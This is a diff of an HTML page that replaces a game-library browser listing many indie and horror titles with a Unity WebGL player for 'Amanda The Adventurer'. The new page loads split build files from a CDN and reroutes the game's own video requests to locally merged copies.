@@ -1,71 +1,214 @@
-<html lang="en" data-theme="vapor"><head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link href="/style/all.css" rel="stylesheet">
-    <script src="/script/theme.js"></script><link id="theme-link" rel="stylesheet" href="/style/theme/vapor.css">
-    <link href="style.css" rel="stylesheet">
-    <script async="" src="https://www.googletagmanager.com/gtag/js?id=G-PPE9RTDYDG"></script>
+<html lang="en-us"><head><script async="" src="https://www.googletagmanager.com/gtag/js?id=G-L7856P3VNT"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-L7856P3VNT');
+</script>
+
+
+
+    <base href="https://cdn.jsdelivr.net/gh/genizy/web-port@main/amanda-the-adventurer/">
+    <meta charset="utf-8">
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <title>Unity WebGL Player | Amanda The Adventurer</title>
+    <link rel="shortcut icon" href="TemplateData/favicon.ico">
+    <link rel="stylesheet" href="TemplateData/style.css">
+    <style>
+        html,
+        body {
+            margin: 0;
+            padding: 0;
+            overflow: hidden;
+            height: 100%;
+            width: 100%;
+        }
+
+        #unity-container {
+            width: 100%;
+            height: 100%;
+            position: fixed;
+            top: 0;
+            left: 0;
+        }
+    #sidebarad1,
+#sidebarad2 {
+  position: fixed;
+  top: 50%;
+  transform: translateY(-50%);
+  width: 160px;
+  height: 600px;
+  padding: 0;
+  margin: 0;
+  z-index: 999999;
+}
+#sidebarad1 {
+  left: 0;
+}
+#sidebarad2 {
+  right: 0;
+}
+.sidebar-close {
+  position: absolute;
+  top: 0;
+  right: 0;
+  width: 22px;
+  height: 22px;
+  line-height: 22px;
+  text-align: center;
+  background: rgba(0,0,0,0.7);
+  color: #fff;
+  font-size: 14px;
+  cursor: pointer;
+  user-select: none;
+  z-index: 10;
+}
+.sidebar-frame {
+  width: 160px;
+  height: 600px;
+  border: none;
+  display: block;
+}
+</style>
+</head>
+
+<body>
+    <div id="loading-text" style="color: black; font-family: cursive; font-size: 48px; text-align: center; margin-top: 20px;">LOADING... (17/76)</div>
+    <div id="unity-container" class="unity-desktop" hidden="">
+        <canvas id="unity-canvas" width="960" height="600"></canvas>
+        <div id="unity-loading-bar">
+            <div id="unity-logo"></div>
+            <div id="unity-progress-bar-empty">
+                <div id="unity-progress-bar-full"></div>
+            </div>
+        </div>
+        <div id="unity-warning"> </div>
+    </div>
     <script>
-      window.dataLayer = window.dataLayer || [];
-      function gtag() {
-        dataLayer.push(arguments);
-      }
-      gtag("js", new Date());
-      gtag("config", "G-PPE9RTDYDG");
+
+        var container = document.querySelector("#unity-container");
+        var canvas = document.querySelector("#unity-canvas");
+        var loadingBar = document.querySelector("#unity-loading-bar");
+        var progressBarFull = document.querySelector("#unity-progress-bar-full");
+        var fullscreenButton = document.querySelector("#unity-fullscreen-button");
+        var warningBanner = document.querySelector("#unity-warning");
+        var loadingText = document.querySelector("#loading-text");
+
+        function unityShowBanner(msg, type) {}
+
+        function mergeFiles(fileParts) {
+            return Promise.all(fileParts.map(part => fetch(part).then(res => res.arrayBuffer()).then(buf => {
+                doneparts++;
+                loadingText.textContent = `LOADING... (${doneparts}/${maxparts})`;
+                return buf;
+            }))).then(buffers => {
+                const mergedBlob = new Blob(buffers);
+                return URL.createObjectURL(mergedBlob);
+            });
+        }
+        let doneparts = 0;
+        let maxparts = 0;
+
+        function getParts(file, start, end) {
+            let parts = [];
+            for (let i = start; i <= end; i++) {
+                parts.push(file + ".part" + i);
+            }
+            maxparts = maxparts + parts.length;
+            return parts;
+        }
+        const originalFetch = window.fetch;
+        window.fetch = async function (...args) {
+            const url = args[0];
+            if (typeof url === "string") {
+                if (url.includes("gn-math.github.io/Clip_Secret Tape 2.webm")) {
+                    return new Response(f2Url, {
+                        status: 200
+                    });
+                } else if (url.includes("gn-math.github.io/Clip_Secret Tape 3.webm")) {
+                    return new Response(f3Url, {
+                        status: 200
+                    });
+                } else if (url.includes("gn-math.github.io/Clip_Secret Tape 5.webm")) {
+                    return new Response(f5Url, {
+                        status: 200
+                    });
+                } else if (url.includes("gn-math.github.io/Clip_Secret Tape 6.webm")) {
+                    return new Response(f6Url, {
+                        status: 200
+                    });
+                }
+            }
+            return originalFetch.apply(this, args);
+        };
+        let f2Url = null;
+        let f6Url = null;
+        let f3Url = null;
+        let f5Url = null;
+        Promise.all([
+            mergeFiles(getParts("Build/Build.wasm", 1, 4)),
+            mergeFiles(getParts("Build/Build.data", 1, 63)),
+            // ---
+            mergeFiles(getParts("gn-math.github.io/Clip_Secret Tape 2.webm", 1, 2)),
+            mergeFiles(getParts("gn-math.github.io/Clip_Secret Tape 6.webm", 1, 2)),
+            mergeFiles(getParts("gn-math.github.io/Clip_Secret Tape 3.webm", 1, 2)),
+            mergeFiles(getParts("gn-math.github.io/Clip_Secret Tape 5.webm", 1, 3))
+        ]).then(([wasmUrl, dataUrl, f2, f6, f3, f5]) => {
+            f2Url = f2;
+            f6Url = f6;
+            f3Url = f3;
+            f5Url = f5;
+            container.hidden = false;
+            var buildUrl = "Build";
+            var loaderUrl = buildUrl + "/Build.loader.js";
+            var config = {
+                dataUrl: dataUrl,
+                frameworkUrl: buildUrl + "/Build.framework.js",
+                codeUrl: wasmUrl,
+                streamingAssetsUrl: "StreamingAssets",
+                companyName: "MangledMaw",
+                productName: "Amanda The Adventurer",
+                productVersion: "1.6.17b",
+                showBanner: unityShowBanner,
+            };
+            if (/iPhone|iPad|iPod|Android/i.test(navigator.userAgent)) {
+                var meta = document.createElement('meta');
+                meta.name = 'viewport';
+                meta.content = 'width=device-width, height=device-height, initial-scale=1.0, user-scalable=no, shrink-to-fit=yes';
+                document.getElementsByTagName('head')[0].appendChild(meta);
+                container.className = "unity-mobile";
+                canvas.className = "unity-mobile";
+            } else {
+                function resizeCanvas() {
+                    canvas.width = window.innerWidth;
+                    canvas.height = window.innerHeight;
+                    canvas.style.width = window.innerWidth + "px";
+                    canvas.style.height = window.innerHeight + "px";
+                }
+                resizeCanvas();
+                window.addEventListener('resize', resizeCanvas);
+            }
+            loadingBar.style.display = "block";
+            var script = document.createElement("script");
+            script.src = loaderUrl;
+            script.onload = () => {
+                createUnityInstance(canvas, config, (progress) => {
+                    progressBarFull.style.width = 100 * progress + "%";
+                }).then((unityInstance) => {
+                    loadingBar.style.display = "none";
+                    document.querySelector("#loading-text").remove();
+                }).catch((message) => {
+                    alert(message);
+                });
+            };
+            document.body.appendChild(script);
+        });
+
     </script>
-  </head>
-  <body>
-    <div id="browser-view" class="view-hidden">
-      <div class="backdrop" id="backdrop"></div>
-      <div class="top-bar-container">
-        <div class="top-bar-content">
-          <div class="dropdown-wrapper" id="source-dropdown-wrapper">
-            <div class="dropdown-menu" id="source-selector">
-              <i class="ri-terminal-box-line" id="current-source-icon"></i>
-              <span class="dropdown-text">gn-ports</span>
-              <i class="ri-arrow-down-s-line" id="source-chevron"></i>
-            </div>
-            <div class="dropdown-options" id="source-options-container"><div class="option" data-index="0" data-icon="ri-calculator-line"><i class="ri-calculator-line"></i>gn-math</div><div class="option" data-index="1" data-icon="ri-sailboat-line"><i class="ri-sailboat-line"></i>Truffled</div><div class="option" data-index="2" data-icon="ri-file-line"><i class="ri-file-line"></i>UGS</div><div class="option" data-index="3" data-icon="ri-moon-line"><i class="ri-moon-line"></i>Selenite</div><div class="option" data-index="4" data-icon="ri-terminal-box-line"><i class="ri-terminal-box-line"></i>gn-ports</div><div class="dropdown-divider"></div><div class="option" data-index="5" data-icon="ri-external-link-line"><i class="ri-external-link-line"></i>Mirrors</div><div class="option" data-index="6" data-icon="ri-play-circle-line"><i class="ri-play-circle-line"></i>Now.GG</div></div>
-          </div>
-          <div class="search-bar">
-            <i class="ri-search-line"></i>
-            <input type="text" placeholder="Search gn-ports...">
-            <div class="dropdown-wrapper filter-dropdown" id="filter-dropdown-wrapper">
-              <i class="ri-filter-3-line filter-icon"></i>
-              <div class="dropdown-options">
-                <div class="option" data-value="default">Default</div>
-                <div class="option" data-value="alphabetical">Alphabetical</div>
-              </div>
-            </div>
-          </div>
-        </div>
-      </div>
-      <div class="grid-container show-bottom-mask show-top-mask" id="grid">
-        <div id="list-description" class="list-description" style="display: none;"></div>
-        <p class="no-results-message" style="display: none;">No results found.</p>
-      <div class="card featured loaded" data-name="bad parenting 1" data-src="https://cdn.jsdelivr.net/gh/gn-math/covers@main/166.png" style="--bg-image: url('https://cdn.jsdelivr.net/gh/gn-math/covers@main/166.png');"><div class="card-name">Bad Parenting 1</div><div class="card-type">LOCAL</div></div><div class="card featured loaded" data-name="five nights at freddy's: sister location" data-src="https://cdn.jsdelivr.net/gh/gn-math/covers@main/185.png" style="--bg-image: url('https://cdn.jsdelivr.net/gh/gn-math/covers@main/185.png');"><div class="card-name">Five Nights at Freddy's: Sister Location</div><div class="card-type">LOCAL</div></div><div class="card featured loaded" data-name="five nights at freddy's: pizza simulator" data-src="https://cdn.jsdelivr.net/gh/gn-math/covers@main/191.png" style="--bg-image: url('https://cdn.jsdelivr.net/gh/gn-math/covers@main/191.png');"><div class="card-name">Five Nights at Freddy's: Pizza Simulator</div><div class="card-type">LOCAL</div></div><div class="card featured loaded" data-name="people playground" data-src="https://cdn.jsdelivr.net/gh/gn-math/covers@main/194-m.png" style="--bg-image: url('https://cdn.jsdelivr.net/gh/gn-math/covers@main/194-m.png');"><div class="card-name">People Playground</div><div class="card-type">LOCAL</div></div><div class="card featured loaded" data-name="r.e.p.o" data-src="https://cdn.jsdelivr.net/gh/gn-math/covers@main/195.png" style="--bg-image: url('https://cdn.jsdelivr.net/gh/gn-math/covers@main/195.png');"><div class="card-name">R.E.P.O</div><div class="card-type">LOCAL</div></div><div class="card featured loaded" data-name="ultrakill" data-src="https://cdn.jsdelivr.net/gh/gn-math/covers@main/196.png" style="--bg-image: url('https://cdn.jsdelivr.net/gh/gn-math/covers@main/196.png');"><div class="card-name">ULTRAKILL</div><div class="card-type">LOCAL</div></div><div class="card featured loaded" data-name="buckshot roulette" data-src="https://cdn.jsdelivr.net/gh/gn-math/covers@main/205.png" style="--bg-image: url('https://cdn.jsdelivr.net/gh/gn-math/covers@main/205.png');"><div class="card-name">Buckshot Roulette</div><div class="card-type">LOCAL</div></div><div class="card featured loaded" data-name="bendy and the ink machine" data-src="https://cdn.jsdelivr.net/gh/gn-math/covers@main/215.png" style="--bg-image: url('https://cdn.jsdelivr.net/gh/gn-math/covers@main/215.png');"><div class="card-name">Bendy and the Ink Machine</div><div class="card-type">LOCAL</div></div><div class="card featured loaded" data-name="that's not my neighbor" data-src="https://cdn.jsdelivr.net/gh/gn-math/covers@main/216.png" style="--bg-image: url('https://cdn.jsdelivr.net/gh/gn-math/covers@main/216.png');"><div class="card-name">That's Not My Neighbor</div><div class="card-type">LOCAL</div></div><div class="card featured loaded" data-name="hotline miami" data-src="https://cdn.jsdelivr.net/gh/gn-math/covers@main/217.png" style="--bg-image: url('https://cdn.jsdelivr.net/gh/gn-math/covers@main/217.png');"><div class="card-name">Hotline Miami</div><div class="card-type">LOCAL</div></div><div class="card featured loaded" data-name="half life" data-src="https://cdn.jsdelivr.net/gh/gn-math/covers@main/262.png" style="--bg-image: url('https://cdn.jsdelivr.net/gh/gn-math/covers@main/262.png');"><div class="card-name">Half Life</div><div class="card-type">LOCAL</div></div><div class="card featured loaded" data-name="quake iii arena" data-src="https://cdn.jsdelivr.net/gh/gn-math/covers@main/263.png" style="--bg-image: url('https://cdn.jsdelivr.net/gh/gn-math/covers@main/263.png');"><div class="card-name">Quake III Arena</div><div class="card-type">LOCAL</div></div><div class="card featured loaded" data-name="pizza tower" data-src="https://cdn.jsdelivr.net/gh/gn-math/covers@main/267.png" style="--bg-image: url('https://cdn.jsdelivr.net/gh/gn-math/covers@main/267.png');"><div class="card-name">Pizza Tower</div><div class="card-type">LOCAL</div></div><div class="card featured loaded" data-name="webfishing" data-src="https://cdn.jsdelivr.net/gh/gn-math/covers@main/423.png" style="--bg-image: url('https://cdn.jsdelivr.net/gh/gn-math/covers@main/423.png');"><div class="card-name">WebFishing</div><div class="card-type">LOCAL</div></div><div class="card featured loaded" data-name="omori" data-src="https://cdn.jsdelivr.net/gh/gn-math/covers@main/427.png" style="--bg-image: url('https://cdn.jsdelivr.net/gh/gn-math/covers@main/427.png');"><div class="card-name">OMORI</div><div class="card-type">LOCAL</div></div><div class="card featured loaded" data-name="yume nikki" data-src="https://cdn.jsdelivr.net/gh/gn-math/covers@main/433.png" style="--bg-image: url('https://cdn.jsdelivr.net/gh/gn-math/covers@main/433.png');"><div class="card-name">Yume Nikki</div><div class="card-type">LOCAL</div></div><div class="card featured loaded" data-name="kindergarten" data-src="https://cdn.jsdelivr.net/gh/gn-math/covers@main/445.png" style="--bg-image: url('https://cdn.jsdelivr.net/gh/gn-math/covers@main/445.png');"><div class="card-name">Kindergarten</div><div class="card-type">LOCAL</div></div><div class="card featured loaded" data-name="kindergarten 2" data-src="https://cdn.jsdelivr.net/gh/gn-math/covers@main/446.png" style="--bg-image: url('https://cdn.jsdelivr.net/gh/gn-math/covers@main/446.png');"><div class="card-name">Kindergarten 2</div><div class="card-type">LOCAL</div></div><div class="card featured loaded" data-name="cuphead" data-src="https://cdn.jsdelivr.net/gh/gn-math/covers@main/465.png" style="--bg-image: url('https://cdn.jsdelivr.net/gh/gn-math/covers@main/465.png');"><div class="card-name">Cuphead</div><div class="card-type">LOCAL</div></div><div class="card featured loaded" data-name="baldi's basics plus" data-src="https://cdn.jsdelivr.net/gh/gn-math/covers@main/467.png" style="--bg-image: url('https://cdn.jsdelivr.net/gh/gn-math/covers@main/467.png');"><div class="card-name">Baldi's Basics Plus</div><div class="card-type">LOCAL</div></div><div class="card featured loaded" data-name="karlson" data-src="https://cdn.jsdelivr.net/gh/gn-math/covers@main/542.png" style="--bg-image: url('https://cdn.jsdelivr.net/gh/gn-math/covers@main/542.png');"><div class="card-name">Karlson</div><div class="card-type">LOCAL</div></div><div class="card featured loaded" data-name="jelly drift" data-src="https://cdn.jsdelivr.net/gh/gn-math/covers@main/543.png" style="--bg-image: url('https://cdn.jsdelivr.net/gh/gn-math/covers@main/543.png');"><div class="card-name">Jelly Drift</div><div class="card-type">LOCAL</div></div><div class="card featured loaded" data-name="slime rancher" data-src="https://cdn.jsdelivr.net/gh/gn-math/covers@main/591.png" style="--bg-image: url('https://cdn.jsdelivr.net/gh/gn-math/covers@main/591.png');"><div class="card-name">Slime Rancher</div><div class="card-type">LOCAL</div></div><div class="card featured loaded" data-name="schoolboy runaway" data-src="https://cdn.jsdelivr.net/gh/gn-math/covers@main/605.png" style="--bg-image: url('https://cdn.jsdelivr.net/gh/gn-math/covers@main/605.png');"><div class="card-name">Schoolboy Runaway</div><div class="card-type">LOCAL</div></div><div class="card featured loaded" data-name="tattletail" data-src="https://cdn.jsdelivr.net/gh/gn-math/covers@main/607.png" style="--bg-image: url('https://cdn.jsdelivr.net/gh/gn-math/covers@main/607.png');"><div class="card-name">Tattletail</div><div class="card-type">LOCAL</div></div><div class="card featured loaded" data-name="oneshot (legacy)" data-src="https://cdn.jsdelivr.net/gh/gn-math/covers@main/622.png" style="--bg-image: url('https://cdn.jsdelivr.net/gh/gn-math/covers@main/622.png');"><div class="card-name">Oneshot (LEGACY)</div><div class="card-type">LOCAL</div></div><div class="card featured loaded" data-name="celeste" data-src="https://cdn.jsdelivr.net/gh/gn-math/covers@main/623.png" style="--bg-image: url('https://cdn.jsdelivr.net/gh/gn-math/covers@main/623.png');"><div class="card-name">Celeste</div><div class="card-type">LOCAL</div></div><div class="games-divider"></div><div class="card loaded" data-name="five nights at freddy's" data-src="https://cdn.jsdelivr.net/gh/gn-math/covers@main/38.png" style="--bg-image: url('https://cdn.jsdelivr.net/gh/gn-math/covers@main/38.png');"><div class="card-name">Five Nights at Freddy's</div><div class="card-type">LOCAL</div></div><div class="card loaded" data-name="five nights at freddy's 2" data-src="https://cdn.jsdelivr.net/gh/gn-math/covers@main/39.png" style="--bg-image: url('https://cdn.jsdelivr.net/gh/gn-math/covers@main/39.png');"><div class="card-name">Five Nights at Freddy's 2</div><div class="card-type">LOCAL</div></div><div class="card loaded" data-name="five nights at freddy's 3" data-src="https://cdn.jsdelivr.net/gh/gn-math/covers@main/40.png" style="--bg-image: url('https://cdn.jsdelivr.net/gh/gn-math/covers@main/40.png');"><div class="card-name">Five Nights at Freddy's 3</div><div class="card-type">LOCAL</div></div><div class="card loaded" data-name="five nights at freddy's 4" data-src="https://cdn.jsdelivr.net/gh/gn-math/covers@main/41.png" style="--bg-image: url('https://cdn.jsdelivr.net/gh/gn-math/covers@main/41.png');"><div class="card-name">Five Nights at Freddy's 4</div><div class="card-type">LOCAL</div></div><div class="card loaded" data-name="crazy cattle 3d" data-src="https://cdn.jsdelivr.net/gh/gn-math/covers@main/164.png" style="--bg-image: url('https://cdn.jsdelivr.net/gh/gn-math/covers@main/164.png');"><div class="card-name">Crazy Cattle 3D</div><div class="card-type">LOCAL</div></div><div class="card loaded" data-name="five nights at freddy's: world" data-src="https://cdn.jsdelivr.net/gh/gn-math/covers@main/190.png" style="--bg-image: url('https://cdn.jsdelivr.net/gh/gn-math/covers@main/190.png');"><div class="card-name">Five Nights at Freddy's: World</div><div class="card-type">LOCAL</div></div><div class="card loaded" data-name="five nights at freddy's: ultimate custom night" data-src="https://cdn.jsdelivr.net/gh/gn-math/covers@main/192.png" style="--bg-image: url('https://cdn.jsdelivr.net/gh/gn-math/covers@main/192.png');"><div class="card-name">Five Nights at Freddy's: Ultimate Custom Night</div><div class="card-type">LOCAL</div></div><div class="card loaded" data-name="do not take this cat home" data-src="https://cdn.jsdelivr.net/gh/gn-math/covers@main/193.png" style="--bg-image: url('https://cdn.jsdelivr.net/gh/gn-math/covers@main/193.png');"><div class="card-name">Do NOT Take This Cat Home</div><div class="card-type">LOCAL</div></div><div class="card loaded" data-name="a bite at freddy's" data-src="https://cdn.jsdelivr.net/gh/gn-math/covers@main/258.png" style="--bg-image: url('https://cdn.jsdelivr.net/gh/gn-math/covers@main/258.png');"><div class="card-name">A Bite at Freddy's</div><div class="card-type">LOCAL</div></div><div class="card loaded" data-name="class of '09" data-src="https://cdn.jsdelivr.net/gh/gn-math/covers@main/259.png" style="--bg-image: url('https://cdn.jsdelivr.net/gh/gn-math/covers@main/259.png');"><div class="card-name">Class of '09</div><div class="card-type">LOCAL</div></div><div class="card loaded" data-name="re:run" data-src="https://cdn.jsdelivr.net/gh/gn-math/covers@main/260.png" style="--bg-image: url('https://cdn.jsdelivr.net/gh/gn-math/covers@main/260.png');"><div class="card-name">RE:RUN</div><div class="card-type">LOCAL</div></div><div class="card loaded" data-name="speed stars" data-src="https://cdn.jsdelivr.net/gh/gn-math/covers@main/266.png" style="--bg-image: url('https://cdn.jsdelivr.net/gh/gn-math/covers@main/266.png');"><div class="card-name">Speed Stars</div><div class="card-type">LOCAL</div></div><div class="card loaded" data-name="endoparasitic" data-src="https://cdn.jsdelivr.net/gh/gn-math/covers@main/286.png" style="--bg-image: url('https://cdn.jsdelivr.net/gh/gn-math/covers@main/286.png');"><div class="card-name">Endoparasitic</div><div class="card-type">LOCAL</div></div><div class="card loaded" data-name="andy's apple farm" data-src="https://cdn.jsdelivr.net/gh/gn-math/covers@main/426.png" style="--bg-image: url('https://cdn.jsdelivr.net/gh/gn-math/covers@main/426.png');"><div class="card-name">Andy's Apple Farm</div><div class="card-type">LOCAL</div></div><div class="card loaded" data-name="five nights at freddy's 4: halloween" data-src="https://cdn.jsdelivr.net/gh/gn-math/covers@main/428.png" style="--bg-image: url('https://cdn.jsdelivr.net/gh/gn-math/covers@main/428.png');"><div class="card-name">Five Nights at Freddy's 4: Halloween</div><div class="card-type">LOCAL</div></div><div class="card loaded" data-name="amanda the adventurer" data-src="https://cdn.jsdelivr.net/gh/gn-math/covers@main/450.png" style="--bg-image: url('https://cdn.jsdelivr.net/gh/gn-math/covers@main/450.png');"><div class="card-name">Amanda the Adventurer</div><div class="card-type">LOCAL</div></div><div class="card loaded" data-name="slender: the 8 pages" data-src="https://cdn.jsdelivr.net/gh/gn-math/covers@main/451.png" style="--bg-image: url('https://cdn.jsdelivr.net/gh/gn-math/covers@main/451.png');"><div class="card-name">Slender: The 8 Pages</div><div class="card-type">LOCAL</div></div><div class="card loaded" data-name="bloodmoney!" data-src="https://cdn.jsdelivr.net/gh/gn-math/covers@main/454.png" style="--bg-image: url('https://cdn.jsdelivr.net/gh/gn-math/covers@main/454.png');"><div class="card-name">BLOODMONEY!</div><div class="card-type">LOCAL</div></div><div class="card loaded" data-name="bergentruck 201x" data-src="https://cdn.jsdelivr.net/gh/gn-math/covers@main/455.png" style="--bg-image: url('https://cdn.jsdelivr.net/gh/gn-math/covers@main/455.png');"><div class="card-name">BERGENTRUCK 201x</div><div class="card-type">LOCAL</div></div><div class="card loaded" data-name="undertale yellow" data-src="https://cdn.jsdelivr.net/gh/gn-math/covers@main/456.png" style="--bg-image: url('https://cdn.jsdelivr.net/gh/gn-math/covers@main/456.png');"><div class="card-name">Undertale Yellow</div><div class="card-type">LOCAL</div></div><div class="card loaded" data-name="raft" data-src="https://cdn.jsdelivr.net/gh/gn-math/covers@main/457.png" style="--bg-image: url('https://cdn.jsdelivr.net/gh/gn-math/covers@main/457.png');"><div class="card-name">Raft</div><div class="card-type">LOCAL</div></div><div class="card loaded" data-name="the deadseat" data-src="https://cdn.jsdelivr.net/gh/gn-math/covers@main/458.png" style="--bg-image: url('https://cdn.jsdelivr.net/gh/gn-math/covers@main/458.png');"><div class="card-name">The Deadseat</div><div class="card-type">LOCAL</div></div><div class="card loaded" data-name="the man in the window" data-src="https://cdn.jsdelivr.net/gh/gn-math/covers@main/459.png" style="--bg-image: url('https://cdn.jsdelivr.net/gh/gn-math/covers@main/459.png');"><div class="card-name">The Man In The Window</div><div class="card-type">LOCAL</div></div><div class="card loaded" data-name="fears to fathom: home alone" data-src="https://cdn.jsdelivr.net/gh/gn-math/covers@main/460.png" style="--bg-image: url('https://cdn.jsdelivr.net/gh/gn-math/covers@main/460.png');"><div class="card-name">Fears to Fathom: Home Alone</div><div class="card-type">LOCAL</div></div><div class="card loaded" data-name="dead plate" data-src="https://cdn.jsdelivr.net/gh/gn-math/covers@main/462.png" style="--bg-image: url('https://cdn.jsdelivr.net/gh/gn-math/covers@main/462.png');"><div class="card-name">DEAD PLATE</div><div class="card-type">LOCAL</div></div><div class="card loaded" data-name="lacey's flash games" data-src="https://cdn.jsdelivr.net/gh/gn-math/covers@main/463.png" style="--bg-image: url('https://cdn.jsdelivr.net/gh/gn-math/covers@main/463.png');"><div class="card-name">Lacey's Flash Games</div><div class="card-type">LOCAL</div></div><div class="card loaded" data-name="baldi's basics classic remastered" data-src="https://cdn.jsdelivr.net/gh/gn-math/covers@main/466.png" style="--bg-image: url('https://cdn.jsdelivr.net/gh/gn-math/covers@main/466.png');"><div class="card-name">Baldi's Basics Classic Remastered</div><div class="card-type">LOCAL</div></div><div class="card" data-name="human expenditure program" data-src="https://cdn.jsdelivr.net/gh/gn-math/covers@main/482.png"><div class="card-name">Human Expenditure Program</div><div class="card-type">LOCAL</div></div><div class="card" data-name="kindergarten 3" data-src="https://cdn.jsdelivr.net/gh/gn-math/covers@main/501.png"><div class="card-name">Kindergarten 3</div><div class="card-type">LOCAL</div></div><div class="card" data-name="stick with it" data-src="https://cdn.jsdelivr.net/gh/gn-math/covers@main/502.png"><div class="card-name">Stick With It</div><div class="card-type">LOCAL</div></div><div class="card" data-name="five nights at candy's" data-src="https://cdn.jsdelivr.net/gh/gn-math/covers@main/503.png"><div class="card-name">Five Nights at Candy's</div><div class="card-type">LOCAL</div></div><div class="card" data-name="five nights at candy's 2" data-src="https://cdn.jsdelivr.net/gh/gn-math/covers@main/504.png"><div class="card-name">Five Nights at Candy's 2</div><div class="card-type">LOCAL</div></div><div class="card" data-name="nubby's number factory" data-src="https://cdn.jsdelivr.net/gh/gn-math/covers@main/517.png"><div class="card-name">Nubby's Number Factory</div><div class="card-type">LOCAL</div></div><div class="card" data-name="touhou mother" data-src="https://cdn.jsdelivr.net/gh/gn-math/covers@main/523.png"><div class="card-name">Touhou Mother</div><div class="card-type">LOCAL</div></div><div class="card" data-name="yandere simulator" data-src="https://cdn.jsdelivr.net/gh/gn-math/covers@main/554.png"><div class="card-name">Yandere Simulator</div><div class="card-type">LOCAL</div></div><div class="card" data-name="getting over it with bennett foddy" data-src="https://cdn.jsdelivr.net/gh/gn-math/covers@main/557.png"><div class="card-name">Getting Over It with Bennett Foddy</div><div class="card-type">LOCAL</div></div><div class="card" data-name="deltatraveler" data-src="https://cdn.jsdelivr.net/gh/gn-math/covers@main/560.png"><div class="card-name">Deltatraveler</div><div class="card-type">LOCAL</div></div><div class="card" data-name="fallout" data-src="https://cdn.jsdelivr.net/gh/gn-math/covers@main/585.png"><div class="card-name">Fallout</div><div class="card-type">LOCAL</div></div><div class="card" data-name="super mario 64" data-src="https://cdn.jsdelivr.net/gh/gn-math/covers@main/588.png"><div class="card-name">Super Mario 64</div><div class="card-type">LOCAL</div></div><div class="card" data-name="sonic cd" data-src="https://cdn.jsdelivr.net/gh/gn-math/covers@main/589.png"><div class="card-name">Sonic CD</div><div class="card-type">LOCAL</div></div><div class="card" data-name="sonic mania" data-src="https://cdn.jsdelivr.net/gh/gn-math/covers@main/590.png"><div class="card-name">Sonic Mania</div><div class="card-type">LOCAL</div></div><div class="card" data-name="minesweeper plus" data-src="https://cdn.jsdelivr.net/gh/gn-math/covers@main/604.png"><div class="card-name">Minesweeper Plus</div><div class="card-type">LOCAL</div></div><div class="card" data-name="sonic.exe (original)" data-src="https://cdn.jsdelivr.net/gh/gn-math/covers@main/606.png"><div class="card-name">Sonic.EXE (ORIGINAL)</div><div class="card-type">LOCAL</div></div><div class="card" data-name="doom 3" data-src="https://cdn.jsdelivr.net/gh/gn-math/covers@main/626.png"><div class="card-name">Doom 3</div><div class="card-type">LOCAL</div></div><div class="card" data-name="pizza tower: scoutdigo" data-src="https://cdn.jsdelivr.net/gh/gn-math/covers@main/628.png"><div class="card-name">Pizza Tower: Scoutdigo</div><div class="card-type">LOCAL</div></div><div class="card" data-name="arthur's nightmare" data-src="https://cdn.jsdelivr.net/gh/gn-math/covers@main/645.png"><div class="card-name">Arthur's Nightmare</div><div class="card-type">LOCAL</div></div><div class="card" data-name="buster jam" data-src="https://cdn.jsdelivr.net/gh/gn-math/covers@main/646.png"><div class="card-name">Buster Jam</div><div class="card-type">LOCAL</div></div><div class="card" data-name="mindwave" data-src="https://cdn.jsdelivr.net/gh/gn-math/covers@main/648.png"><div class="card-name">Mindwave</div><div class="card-type">LOCAL</div></div><div class="card" data-name="look outside" data-src="https://cdn.jsdelivr.net/gh/gn-math/covers@main/649.png"><div class="card-name">Look Outside</div><div class="card-type">LOCAL</div></div><div class="card" data-name="milk inside a bag of milk inside a bag of milk" data-src="https://cdn.jsdelivr.net/gh/gn-math/covers@main/650.png"><div class="card-name">Milk Inside a Bag of Milk Inside a Bag of Milk</div><div class="card-type">LOCAL</div></div><div class="card" data-name="milk outside a bag of milk outside a bag of milk" data-src="https://cdn.jsdelivr.net/gh/gn-math/covers@main/651.png"><div class="card-name">Milk Outside A Bag Of Milk Outside A Bag Of Milk</div><div class="card-type">LOCAL</div></div><div class="card" data-name="midnight shift" data-src="https://cdn.jsdelivr.net/gh/gn-math/covers@main/658.png"><div class="card-name">Midnight Shift</div><div class="card-type">LOCAL</div></div></div>
-    </div>
-    <div id="game-overlay" class="view-active" style="display: block;">
-      <div id="loading-container" class="fade-out" style="display: none;">
-        <div class="lds-ripple">
-          <div></div>
-          <div></div>
-        </div>
-        <div id="loading-message">LOADING..</div>
-      </div>
-      <div id="game-wrapper">
-        <div id="button-panel" style="display: flex;">
-          <button class="icon-button" id="back-btn" title="Back">
-            <i class="ri-arrow-left-line"></i>
-          </button>
-          <button class="icon-button" id="fullscreen-btn" title="Fullscreen">
-            <i class="ri-fullscreen-line"></i>
-          </button>
-        </div>
-        <iframe id="game-content-frame" tabindex="1" src="about:blank" style="display: block; opacity: 1;"></iframe>
-      </div>
-    </div>
-    <script src="script.js"></script>
-  
+
+
